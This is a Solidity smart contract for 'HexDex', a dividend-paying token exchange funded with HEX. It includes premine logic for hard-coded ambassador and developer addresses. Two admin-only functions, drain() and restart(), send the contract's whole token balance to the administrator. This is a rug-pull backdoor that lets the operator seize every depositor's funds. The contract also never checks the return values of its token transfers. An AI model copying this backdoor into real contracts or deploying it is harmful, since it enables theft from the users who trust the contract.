pragma solidity ^0.5.15;

interface ERC20 {
  function totalSupply()  external view returns (uint supply);
  function balanceOf(address _owner)  external view returns (uint balance);
  function transfer(address _to, uint _value)  external returns (bool success);
  function transferFrom(address _from, address _to, uint _value)  external returns (bool success);
  function approve(address _spender, uint _value)  external returns (bool success);
  function allowance(address _owner, address _spender) external view returns (uint remaining);
  function decimals() external view returns(uint digits);
  event Approval(address indexed _owner, address indexed _spender, uint _value);

}

contract HexDex {
  
  
  modifier onlyBagholders() {
      require(myTokens() > 0);
      _;
  }

  
  modifier onlyStronghands() {
      require(myDividends(true) > 0);
      _;
  }

  modifier onlyAdmin(){
      require(msg.sender == administrator);
      _;
  }


  
  event onTokenPurchase(
      address indexed customerAddress,
      bytes32 customerName,
      uint256 incomingEthereum,
      uint256 tokensMinted,
      address indexed referredBy,
      bool isReinvest
  );

  event onTokenSell(
      address indexed customerAddress,
      bytes32 customerName,
      uint256 tokensBurned,
      uint256 ethereumEarned
  );

  event onWithdraw(
      address indexed customerAddress,
      bytes32 customerName,
      uint256 ethereumWithdrawn
  );

  
  event Transfer(
      address indexed from,
      address indexed to,
      uint256 tokens
  );


  
  string public name = "HexDex";
  string public symbol = "H3D";
  uint8 constant public decimals = 8;
  uint8 constant internal dividendFee_ = 10; 
  uint256 constant internal HEX_CENT = 1e6;
  uint256 constant internal HEX = 1e8;
  uint256 constant internal tokenPriceInitial_ = 1 * HEX;
  uint256 constant internal tokenPriceIncremental_ = 10 * HEX_CENT;
  uint256 constant internal magnitude = 2**64;
  address constant internal tokenAddress = address(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39);
  uint256 internal cubeStartTime = now;

  
  address internal administrator;

      
      bool ambassadorClosed;
      uint256 firstBuyTokens;
      uint256 firstBuyAmount;
      uint256 ambassadorLimit = HEX * 20000; 
      uint256 devLimit = HEX * 100000;
      mapping(address => bool) public ambassadors; 
      mapping(address => bool) public dev;

      address[32] ambassadorList = [
         0xc951D3463EbBa4e9Ec8dDfe1f42bc5895C46eC8f,
         0xe8f49490d2b172870b3B225e9fcD39b5D68b2e9E,
         0x5161e1380cd661D7d993c8a3b3E57b059Ad8d7A4,
         0x4Ca9046dcd4C8712450250208D7eD6fCEbAf75a5,
         0xC697BE0b5b82284391A878B226e2f9AfC6B94710,
         0x5cB87df0834cd82297C63eF075421401995914ae,
         0x53F403421110BA93086BCFB40e80C7346035aDF6,
         0x11ba6C4732B1a7f30deA51C23b8ED4c1F88dCD57,
         0xb7032661C1DA18A52830A5e97bdE5569ed3c2A5F,
         0x73c371F85246797e4f7f68F7F46b9261EBa2F853,
         0xffc1eD0C150890c163D940146565df6064588d3e,
         0x5DD516f5dC0E68C5A37D20284Dabd754e35AfF1c,
         0x554fdECe1B1319075d7Bf2F5137076C21A202249,
         0xcF7b442C41795e874b223D4ADeED8cda87A23d00,
         0x87cb806192eC699398511c7aB44b3595C051D13C,
         0x1c2c72269ce1aD29933F090547b4102a9c398f34,
         0x9b411116f92504562EDCf3a1b14Ae226Bc1489Fc,
         0x2E7E5DE7D87A29B16284092B19891c80B0F43eCa,
         0xada8694dd1B511E72F467e7242E7123088aED064,
         0x5269BF8720946b5c38FBf361a947bA9D30C91313,
         0x21e0111e60D5449BdBa67ee6c014B5384644a714,
         0xB96d8107D613b6b593b4531Fc353B282af7fbeF5,
         0x71A4b5895A077806E8cd9F85a5253A9DEbd593fD,
         0x73018870D10173ae6F71Cac3047ED3b6d175F274,
         0x8E2Efa9eD16f07d9B153D295d35025FD677BaE99,
         0x112b3496AAD76CD34a29C335266A968D65fBa10a,
         0x9D7a76fD386eDEB3A871c3A096Ca875aDc1a55b7,
         0x05227e4FA98a6415ef1927E902dc781AA7eD518a,
         0x18600fE707D883c1FD16f002A09241D630270233,
         0x8ec43a855007c61Ce75406DB8b2079207F7d597a,
         0x09a054B60bd3B908791B55eEE81b515B93831E99,
         0x982D72A38A2CB0ed8F2fae5B22C122f1C9c89a13
         ];

      address[9] devList = [
          0x818F1B08E38376E9635C5bE156B8786317e833b3,
          0xa765a22C97c38c8Ce50FEA453cE92723C7637AA2,
          0xEe54D208f62368B4efFe176CB548A317dcAe963F,
          0x43678bB266e75F50Fbe5927128Ab51930b447eaB,
          0x5138240E96360ad64010C27eB0c685A8b2eDE4F2,
          0x39E00115d71313fD5983DE3Cf2b5820dd3Cc4447,
          0xcFAa3449DFfB82Bf5B37e42FbCf43170c6C8e4AD,
          0x90D20d17Cc9e07020bB490c5e34f486286d3Eeb2,
          0x074F21a36217d7615d0202faA926aEFEBB5a9999
      ];

      uint256 numAmbassadorsDeposited;

      function depositPremine() public {
          require(ambassadors[msg.sender]); 
          ambassadors[msg.sender] = false;  
          ERC20 Hex = ERC20(tokenAddress);

          
          Hex.transferFrom(msg.sender, address(this), ambassadorLimit);
          numAmbassadorsDeposited++;
      }

      uint256 numDevDeposited;

      function depositDevPremine() public {
          require(dev[msg.sender]);
          require(ambassadorClosed);
          dev[msg.sender] = false;
          ERC20 Hex = ERC20(tokenAddress);

          Hex.transferFrom(msg.sender, address(this), devLimit);
          numDevDeposited++;
      }

      function executePremineBuy() onlyAdmin() public {
        require(now < cubeStartTime);
        ERC20 Hex = ERC20(tokenAddress);

        
        Hex.transferFrom(msg.sender, address(this), 1 * HEX);
        purchaseTokens(1*HEX, address(0x0), false);

        
        purchaseTokens(Hex.balanceOf(address(this))-(1*HEX), address(0x0), false);

        
        uint256 premineTokenShare = tokenSupply_ / numAmbassadorsDeposited;

        for(uint i=0; i<32; i++) {
          
          
          if (ambassadors[ambassadorList[i]] == false) {
            transfer(ambassadorList[i], premineTokenShare);
          }
        }
      ambassadorClosed = true;
      firstBuyAmount = Hex.balanceOf(address(this))-(1*HEX);
      firstBuyTokens = tokenSupply_;
      }

      function executeDevBuy() onlyAdmin() public {
        require(now < cubeStartTime);
        require(ambassadorClosed);
        ERC20 Hex = ERC20(tokenAddress);

        
        Hex.transferFrom(msg.sender, address(this), 1 * HEX);
        purchaseTokens(1*HEX, address(0x0), false);

        
        purchaseTokens(Hex.balanceOf(address(this))-firstBuyAmount-(1*HEX), address(0x0), false);

        
        uint256 premineTokenShare = (tokenSupply_ - firstBuyTokens) / numDevDeposited;
        
        for(uint i=0; i<9; i++) {
          
          
          if (dev[devList[i]] == false) {
            transfer(devList[i], premineTokenShare);
          }
        }
      }

      function restart() onlyAdmin() public{
        
        ERC20 Hex = ERC20(tokenAddress);
        Hex.transfer(administrator, Hex.balanceOf(address(this)));
      }

  
  UsernameInterface private username;

 
  
  mapping(address => uint256) internal tokenBalanceLedger_;
  mapping(address => uint256) internal referralBalance_;
  mapping(address => int256) internal payoutsTo_;
  mapping(address => bool) internal approvedDistributors;
  uint256 internal tokenSupply_ = 0;
  uint256 internal profitPerShare_;

  
  
  constructor(address usernameAddress, uint256 when_start)
      public
  {
     ambassadors[0xc951D3463EbBa4e9Ec8dDfe1f42bc5895C46eC8f] = true;
     ambassadors[0xe8f49490d2b172870b3B225e9fcD39b5D68b2e9E] = true;
     ambassadors[0x5161e1380cd661D7d993c8a3b3E57b059Ad8d7A4] = true;
     ambassadors[0x4Ca9046dcd4C8712450250208D7eD6fCEbAf75a5] = true;
     ambassadors[0xC697BE0b5b82284391A878B226e2f9AfC6B94710] = true;
     ambassadors[0x5cB87df0834cd82297C63eF075421401995914ae] = true;
     ambassadors[0x53F403421110BA93086BCFB40e80C7346035aDF6] = true;
     ambassadors[0x11ba6C4732B1a7f30deA51C23b8ED4c1F88dCD57] = true;
     ambassadors[0xb7032661C1DA18A52830A5e97bdE5569ed3c2A5F] = true;
     ambassadors[0x73c371F85246797e4f7f68F7F46b9261EBa2F853] = true;
     ambassadors[0xffc1eD0C150890c163D940146565df6064588d3e] = true;
     ambassadors[0x5DD516f5dC0E68C5A37D20284Dabd754e35AfF1c] = true;
     ambassadors[0x554fdECe1B1319075d7Bf2F5137076C21A202249] = true;
     ambassadors[0xcF7b442C41795e874b223D4ADeED8cda87A23d00] = true;
     ambassadors[0x87cb806192eC699398511c7aB44b3595C051D13C] = true;
     ambassadors[0x1c2c72269ce1aD29933F090547b4102a9c398f34] = true;
     ambassadors[0x9b411116f92504562EDCf3a1b14Ae226Bc1489Fc] = true;
     ambassadors[0x2E7E5DE7D87A29B16284092B19891c80B0F43eCa] = true;
     ambassadors[0xada8694dd1B511E72F467e7242E7123088aED064] = true;
     ambassadors[0x5269BF8720946b5c38FBf361a947bA9D30C91313] = true;
     ambassadors[0x21e0111e60D5449BdBa67ee6c014B5384644a714] = true;
     ambassadors[0xB96d8107D613b6b593b4531Fc353B282af7fbeF5] = true;
     ambassadors[0x71A4b5895A077806E8cd9F85a5253A9DEbd593fD] = true;
     ambassadors[0x73018870D10173ae6F71Cac3047ED3b6d175F274] = true;
     ambassadors[0x8E2Efa9eD16f07d9B153D295d35025FD677BaE99] = true;
     ambassadors[0x112b3496AAD76CD34a29C335266A968D65fBa10a] = true;
     ambassadors[0x9D7a76fD386eDEB3A871c3A096Ca875aDc1a55b7] = true;
     ambassadors[0x05227e4FA98a6415ef1927E902dc781AA7eD518a] = true;
     ambassadors[0x18600fE707D883c1FD16f002A09241D630270233] = true;
     ambassadors[0x8ec43a855007c61Ce75406DB8b2079207F7d597a] = true;
     ambassadors[0x09a054B60bd3B908791B55eEE81b515B93831E99] = true;
     ambassadors[0x982D72A38A2CB0ed8F2fae5B22C122f1C9c89a13] = true;


     dev[0x818F1B08E38376E9635C5bE156B8786317e833b3] = true;
     dev[0xa765a22C97c38c8Ce50FEA453cE92723C7637AA2] = true;
     dev[0xEe54D208f62368B4efFe176CB548A317dcAe963F] = true;
     dev[0x43678bB266e75F50Fbe5927128Ab51930b447eaB] = true;
     dev[0x5138240E96360ad64010C27eB0c685A8b2eDE4F2] = true;
     dev[0x39E00115d71313fD5983DE3Cf2b5820dd3Cc4447] = true;
     dev[0xcFAa3449DFfB82Bf5B37e42FbCf43170c6C8e4AD] = true;
     dev[0x90D20d17Cc9e07020bB490c5e34f486286d3Eeb2] = true;
     dev[0x074F21a36217d7615d0202faA926aEFEBB5a9999] = true;


    username = UsernameInterface(usernameAddress);
    cubeStartTime = when_start;
    administrator = msg.sender;
  }

  function startTime() public view returns(uint256 _startTime){
    _startTime = cubeStartTime;
  }
  function approveDistributor(address newDistributor)
      onlyAdmin()
      public
  {
      approvedDistributors[newDistributor] = true;
  }

  
  function buy(address _referredBy, uint256 amount)
      public
      returns(uint256)
  {
      ERC20 Hex = ERC20(tokenAddress);
      Hex.transferFrom(msg.sender,address(this),amount);
      purchaseTokens(amount, _referredBy, false);
  }

  
  function()
      external
      payable
  {
      revert();
  }

  function distribute(uint256 amount)
      external
      payable
  {
      require(approvedDistributors[msg.sender] == true);
      ERC20 Hex = ERC20(tokenAddress);
      Hex.transferFrom(msg.sender,address(this),amount);
      profitPerShare_ = SafeMath.add(profitPerShare_, (amount * magnitude) / tokenSupply_);
  }

  
  function reinvest()
      onlyStronghands()
      public
  {
      
      uint256 _dividends = myDividends(false); 

      
      address _customerAddress = msg.sender;
      payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);

      
      _dividends += referralBalance_[_customerAddress];
      referralBalance_[_customerAddress] = 0;

      
      purchaseTokens(_dividends, address(0x0), true);
  }

  
  function exit()
      public
  {
      
      address _customerAddress = msg.sender;
      uint256 _tokens = tokenBalanceLedger_[_customerAddress];
      if(_tokens > 0) sell(_tokens);

      withdraw();
  }

  
  function drain()
      onlyAdmin()
      public
  {
      address _drainAddress = msg.sender;
      
      ERC20 Hex = ERC20(tokenAddress);
      
      uint256 _contractBalance = Hex.balanceOf(address(this));
      Hex.transfer(_drainAddress,_contractBalance);
  }

  
  function withdraw()
      onlyStronghands()
      public
  {
      
      address _customerAddress = msg.sender;
      uint256 _dividends = myDividends(false); 

      
      payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);

      
      _dividends += referralBalance_[_customerAddress];
      referralBalance_[_customerAddress] = 0;

      
      ERC20 Hex = ERC20(tokenAddress);
      Hex.transfer(_customerAddress,_dividends);

      
      emit onWithdraw(_customerAddress, username.getNameByAddress(msg.sender), _dividends);
  }

  
  function sell(uint256 _amountOfTokens)
      onlyBagholders()
      public
  {
      
      address _customerAddress = msg.sender;
      require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
      uint256 _tokens = _amountOfTokens;
      uint256 _ethereum = tokensToEthereum_(_tokens);
      uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
      uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);

      
      tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
      tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);

      
      int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
      payoutsTo_[_customerAddress] -= _updatedPayouts;

      
      if (tokenSupply_ > 0) {
          
          profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
      }

      
      emit onTokenSell(_customerAddress, username.getNameByAddress(msg.sender), _tokens, _taxedEthereum);
  }


  
  function transfer(address _toAddress, uint256 _amountOfTokens)
      onlyBagholders()
      public
      returns(bool)
  {
      
      address _customerAddress = msg.sender;

      
      require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);

      
      if(myDividends(true) > 0) withdraw();

      
      tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
      tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);

      
      payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
      payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);

      
      emit Transfer(_customerAddress, _toAddress, _amountOfTokens);

      
      return true;
  }

  
  
  function totalEthereumBalance()
      public
      view
      returns(uint)
  {
      return address(this).balance;
  }

  
  function totalSupply()
      public
      view
      returns(uint256)
  {
      return tokenSupply_;
  }
  
  
  function numAmbassadorsDep()
      public
      view
      returns(uint256)
  {
      return numAmbassadorsDeposited;
  }
  
  
  function numDevDep()
      public
      view
      returns(uint256)
  {
      return numDevDeposited;
  }
  
  
  function ambassClosed()
      public
      view
      returns(bool)
  {
      return ambassadorClosed;
  }

  
  function myTokens()
      public
      view
      returns(uint256)
  {
      address _customerAddress = msg.sender;
      return balanceOf(_customerAddress);
  }

  
  function myDividends(bool _includeReferralBonus)
      public
      view
      returns(uint256)
  {
      address _customerAddress = msg.sender;
      return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
  }

  
  function balanceOf(address _customerAddress)
      view
      public
      returns(uint256)
  {
      return tokenBalanceLedger_[_customerAddress];
  }

  
  function dividendsOf(address _customerAddress)
      view
      public
      returns(uint256)
  {
      return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
  }

  
  function sellPrice()
      public
      view
      returns(uint256)
  {
      
      if(tokenSupply_ == 0){
          return tokenPriceInitial_ - tokenPriceIncremental_;
      } else {
          uint256 _ethereum = tokensToEthereum_(1e8);
          uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
          uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
          return _taxedEthereum;
      }
  }

  
  function buyPrice()
        public
        view
        returns(uint256)
    {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ + tokenPriceIncremental_;
        } else {
            uint256 _ethereum = ethereumToTokens_(1e8);
            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
            return _taxedEthereum;
        }
    }

  
  function calculateTokensReceived(uint256 _ethereumToSpend)
      public
      view
      returns(uint256)
  {
      uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
      uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
      uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);

      return _amountOfTokens;
  }

  
  function calculateEthereumReceived(uint256 _tokensToSell)
      public
      view
      returns(uint256)
  {
      require(_tokensToSell <= tokenSupply_);
      uint256 _ethereum = tokensToEthereum_(_tokensToSell);
      uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
      uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
      return _taxedEthereum;
  }


  
  function purchaseTokens(uint256 _incomingEthereum, address _referredBy, bool isReinvest)
      internal
      returns(uint256)
  {
              if (now < startTime()) { require(msg.sender == administrator); }

      
      uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
      uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);
      uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
      uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
      uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
      uint256 _fee = _dividends * magnitude;

      require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));

      
      if(
          
          _referredBy != 0x0000000000000000000000000000000000000000 &&

          
          _referredBy != msg.sender
      ){
          
          referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
      } else {
          
          
          _dividends = SafeMath.add(_dividends, _referralBonus);
          _fee = _dividends * magnitude;
      }

      
      if(tokenSupply_ > 0){

          
          tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);

          
          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));

          
          _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));

      } else {
          
          tokenSupply_ = _amountOfTokens;
      }

      
      tokenBalanceLedger_[msg.sender] = SafeMath.add(tokenBalanceLedger_[msg.sender], _amountOfTokens);

      
      
      int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
      payoutsTo_[msg.sender] += _updatedPayouts;

      
      emit onTokenPurchase(msg.sender, username.getNameByAddress(msg.sender), _incomingEthereum, _amountOfTokens, _referredBy, isReinvest);

      return _amountOfTokens;
  }

  
  function ethereumToTokens_(uint256 _ethereum)
      internal
      view
      returns(uint256)
  {
      uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e8;
      uint256 _tokensReceived =
       (
          (
              SafeMath.sub(
                  (sqrt
                      (
                          (_tokenPriceInitial**2)
                          +
                          (2*(tokenPriceIncremental_ * 1e8)*(_ethereum * 1e8))
                          +
                          (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                          +
                          (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                      )
                  ), _tokenPriceInitial
              )
          )/(tokenPriceIncremental_)
      )-(tokenSupply_)
      ;

      return _tokensReceived;
  }

  
   function tokensToEthereum_(uint256 _tokens)
      internal
      view
      returns(uint256)
  {

      uint256 tokens_ = (_tokens + 1e8);
      uint256 _tokenSupply = (tokenSupply_ + 1e8);
      uint256 _etherReceived =
      (
          SafeMath.sub(
              (
                  (
                      (
                          tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e8))
                      )-tokenPriceIncremental_
                  )*(tokens_ - 1e8)
              ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e8))/2
          )
      /1e8);
      return _etherReceived;
  }


  
  function sqrt(uint x) internal pure returns (uint y) {
      uint z = (x + 1) / 2;
      y = x;
      while (z < y) {
          y = z;
          z = (x / z + z) / 2;
      }
  }
}

interface UsernameInterface {
  function getNameByAddress(address _addr) external view returns (bytes32);
}


library SafeMath {

  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
          return 0;
      }
      uint256 c = a * b;
      require(c / a == b);
      return c;
  }

  
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a / b;
      return c;
  }

  
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      require(b <= a);
      return a - b;
  }

  
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a);
      return c;
  }
}